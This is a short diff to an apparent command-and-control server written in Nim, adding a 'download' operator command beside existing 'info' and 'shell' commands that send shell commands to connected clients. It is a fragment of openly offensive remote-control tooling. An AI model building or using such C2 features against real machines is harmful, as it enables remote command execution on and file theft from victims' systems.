@@ -71,6 +71,9 @@ proc procStdin*(server: C2Server) {.async.} =
                 infoLog "client not found"
         of "info":
             echo @handlingClient
+        of "download":
+            await handlingClient.downloadFile(args[1])
+            await handlingClient.awaitResponse()
         of "shell":
             await handlingClient.sendShellCmd(a_args)
             await handlingClient.awaitResponse()
